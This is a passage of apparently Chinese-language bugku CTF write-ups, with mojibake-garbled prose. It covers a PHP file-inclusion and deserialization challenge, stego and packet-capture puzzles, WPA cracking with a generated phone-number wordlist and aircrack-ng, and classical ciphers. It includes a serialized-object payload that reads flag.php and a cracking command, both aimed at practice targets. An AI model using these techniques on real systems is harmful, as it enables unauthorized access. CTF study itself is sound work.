--&gt;</span><br></pre></td></tr></table></figure><p>å‡ºç°file_get_contentsï¼Œç»•è¿‡ç¬¬ä¸€å±‚ï¼Œç„¶åç”¨ä¼ªåè®®è¯»å–æ–‡ä»¶<br><img src="https://s1.ax1x.com/2018/05/20/CgcFC8.png" alt="CgcFC8.png"><br>å¾—åˆ°base64ç¼–ç ç„¶åè§£ç å¾—åˆ°ä¸‹é¢çš„ä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">     &lt;?php  </span><br><span class="line">  </span><br><span class="line">class Flag&#123;//flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;good&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>æ„Ÿè§‰è¿˜æ˜¯å°‘äº†ç‚¹ä¸œè¥¿ï¼Œå†ç”¨åŒæ ·çš„æ–¹æ³•æŸ¥çœ‹index.php<br>è¿™ä¸€ä¸‹å°±æ„Ÿè§‰æ¯”è¾ƒå…¨äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$txt = $_GET[&quot;txt&quot;];  </span><br><span class="line">$file = $_GET[&quot;file&quot;];  </span><br><span class="line">$password = $_GET[&quot;password&quot;];  </span><br><span class="line">  </span><br><span class="line">if(isset($txt)&amp;&amp;(file_get_contents($txt,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;))&#123;  </span><br><span class="line">    echo &quot;hello friend!&lt;br&gt;&quot;;  </span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123; </span><br><span class="line">        echo &quot;ä¸èƒ½ç°åœ¨å°±ç»™ä½ flagå“¦&quot;;</span><br><span class="line">        exit();  </span><br><span class="line">    &#125;else&#123;  </span><br><span class="line">        include($file);   </span><br><span class="line">        $password = unserialize($password);  </span><br><span class="line">        echo $password;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;else&#123;  </span><br><span class="line">    echo &quot;you are not the number of bugku ! &quot;;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">?&gt;  </span><br><span class="line">  </span><br><span class="line">&lt;!--  </span><br><span class="line">$user = $_GET[&quot;txt&quot;];  </span><br><span class="line">$file = $_GET[&quot;file&quot;];  </span><br><span class="line">$pass = $_GET[&quot;password&quot;];  </span><br><span class="line">  </span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;))&#123;  </span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;  </span><br><span class="line">    include($file); //hint.php  </span><br><span class="line">&#125;else&#123;  </span><br><span class="line">    echo &quot;you are not admin ! &quot;;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçœ‹åˆ°unserializeå°±çŸ¥é“æƒ³è¦è€ƒå¯Ÿååºåˆ—åŒ–æ¼æ´<br>ä»hint.phpçŸ¥é“è¿™ä¸ªç±»ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ„é€ ä¸€ä¸ªç±»ç„¶ååœ¨echoå‡½æ•°è°ƒç”¨åå»è°ƒç”¨__tostring()å‡½æ•°,ç„¶åè¯»å–æ–‡ä»¶<br>è¿™é‡Œæ˜¯æˆ‘æ„é€ çš„ç±»</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class Flag&#123;//flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">          &#125;  </span><br><span class="line"></span><br><span class="line">$a= new Flag();</span><br><span class="line">$a-&gt;file = &apos;flag.php&apos;;</span><br><span class="line">print _r(serialize($a));</span><br></pre></td></tr></table></figure><p>æœ€åå¦<code>password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code>ï¼Œå‘åŒ…å¾—åˆ°flag<br><img src="https://s1.ax1x.com/2018/05/20/Cg6ttf.png" alt="Cg6ttf.png"></p><p>æœ‰æ—¶å€™ä¸ä¸€å®šæ„é€ ç±»ï¼Œæ™®é€šçš„æ•°ç»„ä¹Ÿè¡Œï¼Œæœ€è¿‘åœ¨å®éªŒå§åšé¢˜é‡åˆ°äº†ä¸€é¢˜ç›´æ¥ç”¨æ•°ç»„ååºåˆ—åŒ–çš„é¢˜ç›®ã€‚ã€‚ã€‚è¿˜æ˜¯è¦çœ‹æ¸…æ¥šé¢˜ç›®è¦æ²¡æœ‰ç»™ä½ ç±»ä¹‹ç±»çš„</p><h2 id="è¿˜æ²¡åšå®Œæœ‰å¾…æ›´æ–°"><a href="#è¿˜æ²¡åšå®Œæœ‰å¾…æ›´æ–°" class="headerlink" title="è¿˜æ²¡åšå®Œæœ‰å¾…æ›´æ–°"></a>è¿˜æ²¡åšå®Œæœ‰å¾…æ›´æ–°</h2>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>bugku Misc write up</title>
      <link href="/bugku-Misc.html"/>
      <url>/bugku-Misc.html</url>
      <content type="html"><![CDATA[<h2 id="ç­¾åˆ°é¢˜"><a href="#ç­¾åˆ°é¢˜" class="headerlink" title="ç­¾åˆ°é¢˜"></a>ç­¾åˆ°é¢˜</h2><p>ç›´æ¥å…³æ³¨å…¬ä¼—å·å³å¯ï¼Œä¸å¤šè¯´</p><a id="more"></a><h2 id="è¿™æ˜¯ä¸€å¼ å•çº¯çš„å›¾ç‰‡"><a href="#è¿™æ˜¯ä¸€å¼ å•çº¯çš„å›¾ç‰‡" class="headerlink" title="è¿™æ˜¯ä¸€å¼ å•çº¯çš„å›¾ç‰‡"></a>è¿™æ˜¯ä¸€å¼ å•çº¯çš„å›¾ç‰‡</h2><p>æ‰“å¼€æ‹‰åˆ°æœ€åå‘ç°Htmlç¼–ç ï¼Œä¸Špythonè„šæœ¬ã€‚ã€‚ã€‚ã€‚<br><img src="https://s1.ax1x.com/2018/05/20/CgW1oR.png" alt="CgW1oR.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">str2 = &apos;ä½ çœ‹åˆ°çš„ç¼–ç &apos;</span><br><span class="line"></span><br><span class="line">from HTMLParser import HTMLParser</span><br><span class="line">h = HTMLParser() </span><br><span class="line">s2 = h.unescape(str2)</span><br><span class="line">s1 = h.unescape(h.unescape(str2))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print s1 </span><br><span class="line">print s2</span><br></pre></td></tr></table></figure></p><p>å¾—åˆ°ä¸‹å›¾ï¼Œ<br><img src="https://s1.ax1x.com/2018/05/20/CgWGJx.png" alt="CgWGJx.png"><br>ä¾¿çŒœæµ‹æ˜¯key{you are right}</p><h2 id="éšå†™"><a href="#éšå†™" class="headerlink" title="éšå†™"></a>éšå†™</h2><p>æ‰“å¼€å‘ç°æ˜¯ä¸€å¼ pngæ ¼å¼çš„ç…§ç‰‡ï¼Œæ”¾è¿›StegSolveæ²¡å‘ç°å•¥<br>ç™¾åº¦ä¸€ä¸‹åŸæ¥æ˜¯æ”¹é«˜åº¦<br><img src="https://s1.ax1x.com/2018/05/20/CgWtSK.png" alt="CgWtSK.png"><br>æ‰¾åˆ°IDRç‰‡æ®µå°±æ˜¯00 00 00 0Då¼€å¤´çš„ï¼ŒæŠŠå…¶ä¸­çš„A4æ”¹ä¸ºF4ï¼Œå¾—åˆ°flag<br><img src="https://s1.ax1x.com/2018/05/20/CgWBTA.png" alt="CgWBTA.png"></p><h2 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h2><p>æ‰“å¼€å‘ç°æ˜¯ä¸€ä¸ªæ•°æ®åŒ…ï¼Œç”¨wiresharkæ‰“å¼€ï¼ŒæŸ¥çœ‹æ•´ä¸ªåŒ…çš„ä¿¡æ¯ï¼Œå¯ä»¥è¿½è¸ªä¸€ä¸‹TCPæµï¼Œå‘ç°é‡Œé¢æœ‰ä¸€ä¸ªflag<br><img src="https://s1.ax1x.com/2018/05/20/CgWTf0.png" alt="CgWTf0.png"></p><h2 id="çœ¼è§éå®"><a href="#çœ¼è§éå®" class="headerlink" title="çœ¼è§éå®"></a>çœ¼è§éå®</h2><p>è§£å‹å‘ç°æ˜¯ä¸ªWordæ–‡æ¡£ï¼Œå°è¯•æ‰“å¼€æ‰“ä¸å¼€ï¼Œæ”¾è¿›winhexé‡Œé¢çœ‹æ˜¯504B0304å¼€å¤´çš„ï¼Œä¸€ä¸ªzipæ–‡ä»¶ï¼Œæ”¹åç¼€åå†æ¬¡æ‰“å¼€ï¼Œå¹¶åœ¨é‡Œé¢çš„document.xmlå‘ç°flag<br><img src="https://s1.ax1x.com/2018/05/20/CgWHpV.png" alt="CgWHpV.png"></p><h2 id="åˆä¸€å¼ å›¾ç‰‡ï¼Œè¿˜å•çº¯å—ï¼Ÿï¼Ÿ"><a href="#åˆä¸€å¼ å›¾ç‰‡ï¼Œè¿˜å•çº¯å—ï¼Ÿï¼Ÿ" class="headerlink" title="åˆä¸€å¼ å›¾ç‰‡ï¼Œè¿˜å•çº¯å—ï¼Ÿï¼Ÿ"></a>åˆä¸€å¼ å›¾ç‰‡ï¼Œè¿˜å•çº¯å—ï¼Ÿï¼Ÿ</h2><p>æ”¾è¿›binwalké‡Œè·‘ä¸€ä¸‹ï¼Œå‘ç°é‡Œé¢è¿˜æœ‰ä¸€å¼ å›¾ç‰‡åˆ†ç¦»å‡ºæ¥æ—¢æ˜¯flag<br><img src="https://s1.ax1x.com/2018/05/20/CgfeAA.png" alt="CgfeAA.png"></p><h2 id="çŒœ"><a href="#çŒœ" class="headerlink" title="çŒœ"></a>çŒœ</h2><p>ç›´æ¥ç™¾åº¦æœå›¾ï¼ŒæŸåˆ˜å§“å¥³æ˜æ˜Ÿ</p><h2 id="å®½å¸¦ä¿¡æ¯æ³„éœ²"><a href="#å®½å¸¦ä¿¡æ¯æ³„éœ²" class="headerlink" title="å®½å¸¦ä¿¡æ¯æ³„éœ²"></a>å®½å¸¦ä¿¡æ¯æ³„éœ²</h2><p>çœ‹åˆ°æ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç”¨RoutePassViewæ‰“å¼€ï¼Œé¢˜ç›®æç¤ºæ˜¯ç”¨æˆ·åï¼Œä¾¿å¯»æ‰¾ç”¨æˆ·å<br><img src="https://s1.ax1x.com/2018/05/20/CgfmtI.png" alt="CgfmtI.png"></p><h2 id="éšå†™2"><a href="#éšå†™2" class="headerlink" title="éšå†™2"></a>éšå†™2</h2><p>jpgå›¾ç‰‡ä¸Šæ¥å…ˆä¸€æ³¢æ“ä½œï¼Œæ²¡çœ‹åˆ°å•¥æœ‰ç”¨çš„ï¼Œbinwalkä¸€ä¸‹ï¼Œå‘ç°é‡Œé¢æœ‰zipï¼Œåˆ†ç¦»å‡ºæ¥ï¼Œæ‰“å¼€ä¸€çœ‹è¿˜æ˜¯ä¸ªå¯†ç é¢˜ã€‚ã€‚ã€‚ã€‚3ä¸ªæ•°çš„å¯†ç <br>çœ‹ä¸æ‡‚ä»–çš„æç¤ºï¼Œç„¶åè‡ªå·±ç”¨å·¥å…·çˆ†ç ´ä¸€æ³¢ï¼Œå¯†ç æ˜¯871.ã€‚ã€‚ã€‚ã€‚è¿™å°¼ç›è·Ÿæ–—åœ°ä¸»æœ‰ä»€ä¹ˆå…³ç³»<br><img src="https://s1.ax1x.com/2018/05/20/Cgfg41.png" alt="Cgfg41.png"><br>è§£å¼€ä¹‹åå‘ç°é‡Œé¢æœ‰ä¸€å¼ å›¾ç‰‡winhexæ‰“å¼€æœ€åé‚£é‡Œæœ‰flagã€‚ã€‚ã€‚è¿˜å¾—Base64ä¸€æ³¢æœ€åå¾—åˆ°flag<br><img src="https://s1.ax1x.com/2018/05/20/CgfW36.png" alt="CgfW36.png"></p><h2 id="å¤šç§æ–¹æ³•è§£å†³"><a href="#å¤šç§æ–¹æ³•è§£å†³" class="headerlink" title="å¤šç§æ–¹æ³•è§£å†³"></a>å¤šç§æ–¹æ³•è§£å†³</h2><p>ä¸‹è½½ä¸‹æ¥å‘ç°æ˜¯ä¸€ä¸ªexeæ–‡ä»¶ï¼Œåˆæ‰“ä¸å¼€ï¼Œæ”¾è¿›Notepad++çœ‹ä¸€ä¸‹ï¼Œå‘ç°è¿™æ˜¯ä¸€ä¸ªå¯ä»¥è½¬å›¾ç‰‡çš„Base64<br>ç›´æ¥è½¬æ¢å³å¯  <a href="http://base64.xpcha.com/" target="_blank" rel="noopener">http://base64.xpcha.com/</a> æ˜¯ä¸ªäºŒç»´ç <br>æ‰«ä¸€ä¸‹è·å¾—key<br><img src="https://s1.ax1x.com/2018/05/20/CgfhjO.png" alt="CgfhjO.png"></p><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><p>ä¸‹è½½ä¸‹æ¥æ˜¯ä¸€ä¸ªlinuxä¸‹çš„å‹ç¼©åŒ…ï¼Œé‚£å°±å»linuxä¸‹ç”¨tarå‘½ä»¤è§£å‹ç¼©å°±è¡Œï¼Œé‡Œé¢çš„æ–‡ä»¶Notepad++æ‰“å¼€å¹¶æœç´¢å…³é”®å­—keyå¾—åˆ°flag<br><img src="https://s1.ax1x.com/2018/05/20/Cgf5uD.png" alt="Cgf5uD.png"></p><h2 id="éšå†™3"><a href="#éšå†™3" class="headerlink" title="éšå†™3"></a>éšå†™3</h2><p>æ„Ÿè§‰ä¸‹é¢è¿˜æœ‰ä¸œè¥¿ï¼Œäºæ˜¯å°±æ‰“ç®—æ”¹é«˜åº¦ï¼Œäºæ˜¯å‘ç°äº†flag</p><h2 id="Linux2"><a href="#Linux2" class="headerlink" title="Linux2"></a>Linux2</h2><p>ç›´æ¥è§£å‹Notepad++æ‰“å¼€æœç´¢keyå°±æœ‰äº†ï¼Œæˆ‘ä¸çŸ¥é“è¿™ä¸ªé¢˜è¯´Linuxæƒ³å¹²å˜›ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><h2 id="ç»†å¿ƒçš„å¤§è±¡"><a href="#ç»†å¿ƒçš„å¤§è±¡" class="headerlink" title="ç»†å¿ƒçš„å¤§è±¡"></a>ç»†å¿ƒçš„å¤§è±¡</h2><p>è§£å‹åçš„å›¾ç‰‡å±æ€§é‡Œé¢æœ‰Base64ç¼–ç ï¼Œå…ˆè§£ç ï¼Œæ²¡å•¥æ„ä¹‰ï¼Œç„¶åbinwalkä¸€ä¸‹ï¼Œå‘ç°é‡Œé¢è¿˜æœ‰åŠ å¯†rarï¼Œä¾¿çŒœæµ‹åˆšçŒœçš„Base64æ˜¯å¯†ç ï¼Œè§£å‹æˆåŠŸï¼Œ<br><img src="https://s1.ax1x.com/2018/05/20/CgfoHH.png" alt="CgfoHH.png"><br>åˆæ˜¯é‚£ä¸ªä¹‹å‰æ”¹é«˜åº¦çš„å›¾ç‰‡ï¼Œ<br>è·å¾—flag<br><img src="https://s1.ax1x.com/2018/05/20/CgfHUA.png" alt="CgfHUA.png"></p><h2 id="å¬é¦–éŸ³ä¹"><a href="#å¬é¦–éŸ³ä¹" class="headerlink" title="å¬é¦–éŸ³ä¹"></a>å¬é¦–éŸ³ä¹</h2><p>ç”¨Audacityæ‰“å¼€ä¸€çœ‹æ˜¯æ‘©æ–¯å¯†ç ï¼Œç›´æ¥è§£å¯†å³å¯ï¼Œç„¶åç›´æ¥æäº¤<br><img src="https://s1.ax1x.com/2018/05/20/Cgfb4I.png" alt="Cgfb4I.png"></p><h2 id="å¥½å¤šæ•°å€¼"><a href="#å¥½å¤šæ•°å€¼" class="headerlink" title="å¥½å¤šæ•°å€¼"></a>å¥½å¤šæ•°å€¼</h2><p>ç¬¬ä¸€æ¬¡ç¢°åˆ°è¿™ä¸ªç±»å‹çš„é¢˜ç›®<br>åˆ©ç”¨äº†pythonçš„PILåº“ã€‚ã€‚ã€‚ã€‚<br>ç„¶åå‚è€ƒäº†ä¸‹é¢çš„åšå®¢<br><a href="https://www.cnblogs.com/webFuckeeeer/p/4536776.html" target="_blank" rel="noopener">https://www.cnblogs.com/webFuckeeeer/p/4536776.html</a><br>ç»“æœå‘ç°é¢˜ç›®å¥½åƒæœ‰ç‚¹é—®é¢˜ã€‚ã€‚ã€‚ã€‚äººå®¶éƒ½æ˜¯61366è¡Œï¼Œæˆ‘è¿™é‡Œåªæœ‰emmmmã€‚ã€‚ã€‚ã€‚ã€‚<br><img src="https://s1.ax1x.com/2018/05/20/CgfO8P.png" alt="CgfO8P.png"><br>è€Œä¸”åƒç´ ä¹Ÿä¸å®Œæ•´ã€‚ã€‚ã€‚ã€‚ã€‚åº”è¯¥æ˜¯è¡¨å“¥æ›´æ–°ä¹‹åæŠŠé¢˜ç›®çš„æ–‡ä»¶æ²¡æœ‰å…¨é€‰å®Œå°±å¤åˆ¶è¿›å»äº†ã€‚ã€‚<br>æˆ‘å°±ç›´æ¥è¾“å…¥åˆ«äººçš„flagäº†</p><h2 id="å›¾ç©·åŒ•è§"><a href="#å›¾ç©·åŒ•è§" class="headerlink" title="å›¾ç©·åŒ•è§"></a>å›¾ç©·åŒ•è§</h2><p>ç”¨HXDæ‰“å¼€æ‰¾ä¸€ä¸‹jpgçš„æ–‡ä»¶å°¾FFD9ï¼Œå‘ç°åé¢æœ‰å¤§é‡çš„16è¿›åˆ¶æ•°æ®ã€‚ã€‚<br><img src="https://s1.ax1x.com/2018/05/20/CgfXgf.png" alt="CgfXgf.png"><br>å¤åˆ¶è¿›å»ç”¨Notepad++çš„converteråŠŸèƒ½è½¬æ¢ä¸ºASCIIå‘ç°ä¸€å¤§ä¸²åæ ‡<br><img src="https://s1.ax1x.com/2018/05/20/Cgfjv8.png" alt="Cgfjv8.png"><br>ç”¨ä¸€ä¸ªå«gunplot(æˆ‘ç”¨çš„æ˜¯Windowsä¸‹çš„)çš„ç”»å›¾è½¯ä»¶æŠŠè¿™äº›åæ ‡ç‚¹ç”»å‡ºæ¥ï¼Œå…ˆæŠŠä»–ä»¬çš„æ ¼å¼ç»™å¼„å¥½<br><img src="https://s1.ax1x.com/2018/05/20/CgfxKS.png" alt="CgfxKS.png"></p><p>ç„¶åç”¨plot + æ–‡ä»¶åçš„å‘½ä»¤å¯¼å‡ºæ–‡ä»¶ï¼Œå†æ‰«ä¸€æ‰«å³å¯<br><img src="https://s1.ax1x.com/2018/05/20/CgfzDg.png" alt="CgfzDg.png"><br><img src="https://s1.ax1x.com/2018/05/20/Cgh9Ej.png" alt="Cgh9Ej.png"></p><h2 id="å¦¹å­çš„é™Œé™Œ"><a href="#å¦¹å­çš„é™Œé™Œ" class="headerlink" title="å¦¹å­çš„é™Œé™Œ"></a>å¦¹å­çš„é™Œé™Œ</h2><p>å¸¸è§„æ­¥éª¤å…ˆbinwalkä¸€æ³¢ï¼Œå‘ç°é‡Œé¢æœ‰ä¸€ä¸ªåŠ å¯†çš„raråŒ…ï¼Œæ‰¾äº†å¾ˆä¹…éƒ½æ²¡æ‰¾åˆ°å¯†ç ã€‚ã€‚ã€‚ã€‚ã€‚<br>å‘ç°å›¾ç‰‡ä¸Šçš„å­—ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚å¯èƒ½æ˜¯å¯†ç ã€‚ã€‚ã€‚ã€‚å°è¯•ä¸€ä¸‹<br>å–œæ¬¢æˆ‘å—.ç«Ÿç„¶æ˜¯å¯†ç ã€‚ã€‚ã€‚ã€‚æˆ‘å»<br>é‡Œé¢æœ‰ä¸€ä¸ªtxtæ–‡ä»¶<br><img src="https://s1.ax1x.com/2018/05/20/CghCUs.png" alt="CghCUs.png"><br>å…ˆè§£ç ç¬¬ä¸€ä¸ªæ‘©æ–¯å¯†ç <br>å‘ç°æ˜¯ä¸€ä¸ªè§£å¯†ç½‘å€ã€‚ã€‚ã€‚ã€‚ã€‚<br><img src="https://s1.ax1x.com/2018/05/20/CghP5n.png" alt="CghP5n.png"><br>å†è§£å¯†ä»¥ä¸‹ç½‘å€åé¢çš„base64<br><img src="https://s1.ax1x.com/2018/05/20/CghA2V.png" alt="CghA2V.png"><br><img src="https://s1.ax1x.com/2018/05/20/CghEvT.png" alt="CghEvT.png"><br>è§£å¯†å‡ºæ¥å‘ç°æ˜¯ä¸€å¼ äºŒç»´ç ï¼Œæ‰«ä¸€ä¸‹å¾—åˆ°flag<br><img src="https://s1.ax1x.com/2018/05/20/CghZKU.png" alt="CghZKU.png"></p><h2 id="ä¸­å›½èœåˆ€"><a href="#ä¸­å›½èœåˆ€" class="headerlink" title="ä¸­å›½èœåˆ€"></a>ä¸­å›½èœåˆ€</h2><p>è¿™ä¸€é¢˜å¯ä»¥ç›´æ¥ç”¨binwalkæŠŠé‡Œé¢çš„gzipåˆ†ç¦»å‡ºæ¥ï¼Œé‚£ä¸ªå°±æ˜¯flag<br><img src="https://s1.ax1x.com/2018/02/27/9BsEm6.png" alt="9BsEm6.png"><br><img src="https://s1.ax1x.com/2018/02/27/9BsmkD.png" alt="9BsmkD.png"></p><h2 id="è¿™ä¹ˆå¤šæ•°æ®åŒ…"><a href="#è¿™ä¹ˆå¤šæ•°æ®åŒ…" class="headerlink" title="è¿™ä¹ˆå¤šæ•°æ®åŒ…"></a>è¿™ä¹ˆå¤šæ•°æ®åŒ…</h2><p>å‘ç°ä»ç¬¬104ä¸ªåŒ…å¼€å§‹åº”è¯¥æ˜¯æ”»å‡»æœºï¼ˆ192.168.116.138ï¼‰åœ¨å‘ç›®æ ‡æœºï¼ˆ192.168.116.159ï¼‰è¿›è¡Œç«¯å£æ‰«æï¼Œä¹‹åå¯ä»¥å¤§è‡´æ‰¾åˆ°æ”»å‡»æœºè¿œç¨‹è¿æ¥ç›®æ ‡æœºçš„åŒ…ï¼ˆé€šè¿‡3389ç«¯å£ï¼‰ï¼Œä»¥åŠsmbåè®®çš„åŒ…ï¼ˆç”¨äºWebè¿æ¥å’Œå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´çš„ä¿¡æ¯æ²Ÿé€šï¼‰ï¼Œå†å¾€ä¸‹å¯ä»¥æ‰¾åˆ°ä»¥5542å¼€å§‹çš„åŒ…å·²ç»getshell<br>è¿½è¸ªTCPæµï¼Œå‘ç°<br><img src="https://s1.ax1x.com/2018/02/27/9BsMpd.png" alt="9BsMpd.png"><br>ç„¶åbase64å³å¯</p><h2 id="è¿™ä¹ˆå¤šæ•°æ®åŒ…-1"><a href="#è¿™ä¹ˆå¤šæ•°æ®åŒ…-1" class="headerlink" title="è¿™ä¹ˆå¤šæ•°æ®åŒ…"></a>è¿™ä¹ˆå¤šæ•°æ®åŒ…</h2><p>è¿½è¸ªTCPæµï¼Œå‘ç°</p><p>ç„¶åbase64å³å¯</p><h2 id="æƒ³è¹­ç½‘å…ˆè§£å¼€å¯†ç "><a href="#æƒ³è¹­ç½‘å…ˆè§£å¼€å¯†ç " class="headerlink" title="æƒ³è¹­ç½‘å…ˆè§£å¼€å¯†ç "></a>æƒ³è¹­ç½‘å…ˆè§£å¼€å¯†ç </h2><p>å…ˆå†™ä¸ªè„šæœ¬æŠŠå¯†ç è·‘å‡ºæ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#encoding:utf-8</span><br><span class="line">import string</span><br><span class="line">attendNum = string.digits</span><br><span class="line">str1 = &apos;1391040&apos;</span><br><span class="line">f = open(&apos;telephone.txt&apos;,&apos;w&apos;)</span><br><span class="line">for i in attendNum:</span><br><span class="line">for j in attendNum:</span><br><span class="line">for k in attendNum:</span><br><span class="line">for l in attendNum:</span><br><span class="line">f.write(str1+i+j+k+l+&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>ç„¶åå†ç”¨aircrackå®Œæˆå³å¯<br>aircrack-ng.exe wifi.cap -w telephone.txt<br>å‘ç°3ä¸Šé¢å‡ºç°æ¡æ‰‹åŒ…ï¼Œæˆ‘ä»¬å°±åœ¨ index  number of targetå†™3<br>ç»“æœå‡ºæ¥<br><img src="https://s1.ax1x.com/2018/05/20/CgWQeJ.png" alt="CgWQeJ.png"></p><h2 id="è¿˜æ²¡åšå®Œï¼Œæœ‰å¾…æ›´æ–°ã€‚ã€‚ã€‚"><a href="#è¿˜æ²¡åšå®Œï¼Œæœ‰å¾…æ›´æ–°ã€‚ã€‚ã€‚" class="headerlink" title="è¿˜æ²¡åšå®Œï¼Œæœ‰å¾…æ›´æ–°ã€‚ã€‚ã€‚"></a>è¿˜æ²¡åšå®Œï¼Œæœ‰å¾…æ›´æ–°ã€‚ã€‚ã€‚</h2>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>bugku Crypto write up</title>
      <link href="/bugku-Crypto.html"/>
      <url>/bugku-Crypto.html</url>
      <content type="html"><![CDATA[<h2 id="æ»´ç­”-æ»´"><a href="#æ»´ç­”-æ»´" class="headerlink" title="æ»´ç­”~æ»´"></a>æ»´ç­”~æ»´</h2><p>é‚ä¸€çœ‹å°±çŸ¥é“æ˜¯æ‘©æ–¯å¯†ç ï¼Œç›´æ¥æ‘©æ–¯è§£å¯†ï¼Œè·å¾—å¯†ç <br><a id="more"></a></p><h2 id="èªæ˜çš„å°ç¾Š"><a href="#èªæ˜çš„å°ç¾Š" class="headerlink" title="èªæ˜çš„å°ç¾Š"></a>èªæ˜çš„å°ç¾Š</h2><p>æ ¹æ®æç¤ºåº”è¯¥æ˜¯æ …æ åŠ å¯†è€Œä¸”æ˜¯2æ ï¼Œé‚å°è¯•æ …æ è§£å¯†ï¼Œç«–ç€çœ‹å°±æ˜¯key<br><img src="https://s1.ax1x.com/2018/05/20/Cg2sHA.png" alt="Cg2sHA.png"></p><h2 id="ok"><a href="#ok" class="headerlink" title="ok"></a>ok</h2><p>è§£å¯†ç½‘å€:<a href="http://tool.bugku.com/brainfuck/" target="_blank" rel="noopener">http://tool.bugku.com/brainfuck/</a><br>å…¨éƒ½æ˜¯Ookå°±å°è¯•Ookè§£å¯†ï¼Œå¾—å‡ºflagï¼Œå¦‚å›¾<br><img src="https://s1.ax1x.com/2018/05/20/Cg26AI.png" alt="Cg26AI.png"></p><h2 id="è¿™ä¸æ˜¯æ‘©æ–¯å¯†ç "><a href="#è¿™ä¸æ˜¯æ‘©æ–¯å¯†ç " class="headerlink" title="è¿™ä¸æ˜¯æ‘©æ–¯å¯†ç "></a>è¿™ä¸æ˜¯æ‘©æ–¯å¯†ç </h2><p>è§£å¯†ç½‘å€:<a href="http://tool.bugku.com/brainfuck/" target="_blank" rel="noopener">http://tool.bugku.com/brainfuck/</a><br>brainfuckè§£ç å°±å¾—åˆ°flag</p><h2 id="ç®€å•åŠ å¯†"><a href="#ç®€å•åŠ å¯†" class="headerlink" title="ç®€å•åŠ å¯†"></a>ç®€å•åŠ å¯†</h2><p>å‡¯æ’’è§£å¯†åå‘ç°æœ‰ä¸€æ®µBase64ï¼Œç„¶åå†æ¥ä¸€æ³¢base64è§£ç å¾—åˆ°flag<br><img src="https://s1.ax1x.com/2018/05/20/Cg2g4P.png" alt="Cg2g4P.png"><br><img src="https://s1.ax1x.com/2018/05/20/Cg2O3T.png" alt="Cg2O3T.png"></p><h2 id="ä¸€æ®µBase64"><a href="#ä¸€æ®µBase64" class="headerlink" 